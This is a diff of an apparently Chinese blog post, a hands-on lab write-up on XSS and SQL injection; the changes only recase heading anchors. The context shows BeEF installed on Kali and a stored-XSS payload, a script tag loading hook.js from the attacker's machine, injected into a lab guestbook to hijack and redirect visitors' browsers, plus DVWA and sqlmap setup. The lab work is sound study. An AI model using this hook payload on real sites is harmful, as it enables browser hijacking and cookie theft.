@@ -109,14 +109,14 @@
 </table>
 <p>@[toc]</p>
 <h2 id="0x01-实验知识点"><a class="header-anchor" href="#0x01-实验知识点">¶</a>0x01 实验知识点</h2>
-<h3 id="1x01-什么是xss？"><a class="header-anchor" href="#1x01-什么是xss？">¶</a>1x01 什么是XSS？</h3>
+<h3 id="1x01-什么是XSS？"><a class="header-anchor" href="#1x01-什么是XSS？">¶</a>1x01 什么是XSS？</h3>
 <p>XSS又叫CSS (Cross Site Script) 也称为跨站，它是指<strong>攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</strong></p>
 <p><strong>XSS攻击</strong>是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。</p>
-<h3 id="1x02-什么是cookie？"><a class="header-anchor" href="#1x02-什么是cookie？">¶</a>1x02 什么是Cookie？</h3>
+<h3 id="1x02-什么是Cookie？"><a class="header-anchor" href="#1x02-什么是Cookie？">¶</a>1x02 什么是Cookie？</h3>
 <p>Cookie，有时也用其复数形式Cookies，指某些网站<strong>为了辨别用户身份</strong>、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。<br>
 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。</p>
 <a id="more"></a>
-<h3 id="1x03-xss漏洞的分类"><a class="header-anchor" href="#1x03-xss漏洞的分类">¶</a>1x03 XSS漏洞的分类</h3>
+<h3 id="1x03-XSS漏洞的分类"><a class="header-anchor" href="#1x03-XSS漏洞的分类">¶</a>1x03 XSS漏洞的分类</h3>
 <p><strong>存储型 XSS</strong>：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。<br>
 如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个<strong>定时炸弹</strong>放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。<br>
 存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。</p>
@@ -125,7 +125,7 @@ Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），�
 <p>**反射型XSS：**仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。</p>
 <p>关于反射型的XSS漏洞，我之前的博客也有进行整理，链接如下</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/python_LC_nohtyp/article/details/106731406">【白帽子学习笔记13】DVWA 反射型XSS（跨站点脚本攻击）</a></p>
-<h3 id="1x04-sql注入攻击"><a class="header-anchor" href="#1x04-sql注入攻击">¶</a>1x04 SQL注入攻击</h3>
+<h3 id="1x04-SQL注入攻击"><a class="header-anchor" href="#1x04-SQL注入攻击">¶</a>1x04 SQL注入攻击</h3>
 <p>所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。<br>
 <strong>为什么会有SQL注入攻击？</strong><br>
 很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。<br>
@@ -133,8 +133,8 @@ Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），�
 <p>关于SQL注入的常用语法我也有进行整理，链接如下：<br>
 <a target="_blank" rel="noopener" href="https://blog.csdn.net/python_LC_nohtyp/article/details/106862663">【白帽子学习笔记14】SQL注入常用语句</a><br>
 <a target="_blank" rel="noopener" href="https://blog.csdn.net/python_LC_nohtyp/article/details/107589604">【白帽子学习笔记15】XVWA SQL Injection</a></p>
-<h2 id="0x02-xss部分：beef"><a class="header-anchor" href="#0x02-xss部分：beef">¶</a>0x02 XSS部分：Beef</h2>
-<h3 id="1x01-搭建guestbook网站"><a class="header-anchor" href="#1x01-搭建guestbook网站">¶</a>1x01 搭建GuestBook网站</h3>
+<h2 id="0x02-XSS部分：Beef"><a class="header-anchor" href="#0x02-XSS部分：Beef">¶</a>0x02 XSS部分：Beef</h2>
+<h3 id="1x01-搭建GuestBook网站"><a class="header-anchor" href="#1x01-搭建GuestBook网站">¶</a>1x01 搭建GuestBook网站</h3>
 <p>本次实验中我在Win Server 2003中搭建了Guestbook环境（IIS），搭建过程中需要注意以下几点</p>
 <ul>
 <li>在搭建IIS配置完成后注意将网站所在的文件夹权限打开，将Everyone用户组给到改文件夹的完全控制权限。</li>
@@ -142,7 +142,7 @@ Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），�
 <li>本次实验中虚拟机网络模式：Net模式</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20201117121506193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="1x02-awvs扫描"><a class="header-anchor" href="#1x02-awvs扫描">¶</a>1x02 AWVS扫描</h3>
+<h3 id="1x02-AWVS扫描"><a class="header-anchor" href="#1x02-AWVS扫描">¶</a>1x02 AWVS扫描</h3>
 <p>首先我们使用AWVS扫描刚才搭建的网站</p>
 <p><img src="https://img-blog.csdnimg.cn/2020111712280017.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
 <img src="https://img-blog.csdnimg.cn/20201117122818910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
@@ -151,7 +151,7 @@ Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），�
 <img src="https://img-blog.csdnimg.cn/2020111712402383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
 <img src="https://img-blog.csdnimg.cn/20201117124044245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
 发现在error.asp和add.asp分别都有一个XSS漏洞。</p>
-<h3 id="1x03-kail中使用beef生成恶意代码"><a class="header-anchor" href="#1x03-kail中使用beef生成恶意代码">¶</a>1x03 Kail中使用Beef生成恶意代码</h3>
+<h3 id="1x03-Kail中使用Beef生成恶意代码"><a class="header-anchor" href="#1x03-Kail中使用Beef生成恶意代码">¶</a>1x03 Kail中使用Beef生成恶意代码</h3>
 <p>现在Kail-2020中应该是没有自带Beef了，我们需要自己安装一下<br>
 <code>sudo apt-get install beef-xss</code><br>
 然后cd进入到这个文件夹中：<br>
@@ -177,8 +177,8 @@ Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），�
 <p>访问一下hook.js里面有自带的恶意代码<br>
 <img src="https://img-blog.csdnimg.cn/2020111713564093.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
 只要访问到这个网站，对方的浏览器就会被劫持。</p>
-<h3 id="1x04-xss注入漏洞"><a class="header-anchor" href="#1x04-xss注入漏洞">¶</a>1x04 XSS注入漏洞</h3>
-<h4 id="2x01-xss劫持网站"><a class="header-anchor" href="#2x01-xss劫持网站">¶</a>2x01 XSS劫持网站</h4>
+<h3 id="1x04-XSS注入漏洞"><a class="header-anchor" href="#1x04-XSS注入漏洞">¶</a>1x04 XSS注入漏洞</h3>
+<h4 id="2x01-XSS劫持网站"><a class="header-anchor" href="#2x01-XSS劫持网站">¶</a>2x01 XSS劫持网站</h4>
 <p>现在使用自己的本机访问留言簿的网站，并将XSS注入恶意代码。<br>
 XSS注入代码如下：<br>
 <code>&lt;script src=&quot;http://Kali的IP地址:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
@@ -196,7 +196,7 @@ XSS注入代码如下：<br>
 <p><img src="https://img-blog.csdnimg.cn/20201117150244138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
 在命令中选择，Redirect Browser，填入学校地址，然后点击Execute。就可以发现网页被重定向了。</p>
 <p>本次实验中的XSS攻击属于注入型XSS攻击。</p>
-<h2 id="0x02-sql注入-dvwa-sqlmap-mysql"><a class="header-anchor" href="#0x02-sql注入-dvwa-sqlmap-mysql">¶</a>0x02 SQL注入（DVWA+SQLMAP+Mysql）</h2>
+<h2 id="0x02-SQL注入（DVWA-SQLMAP-Mysql）"><a class="header-anchor" href="#0x02-SQL注入（DVWA-SQLMAP-Mysql）">¶</a>0x02 SQL注入（DVWA+SQLMAP+Mysql）</h2>
 <h3 id="1x01-实验环境搭建"><a class="header-anchor" href="#1x01-实验环境搭建">¶</a>1x01 实验环境搭建</h3>
 <p>打开Metasploitable2后，里面有搭建好的DVWA，访问<code>http://Metasploitable的IP/dvwa</code>即可<br>
 <img src="https://img-blog.csdnimg.cn/20201117161430968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
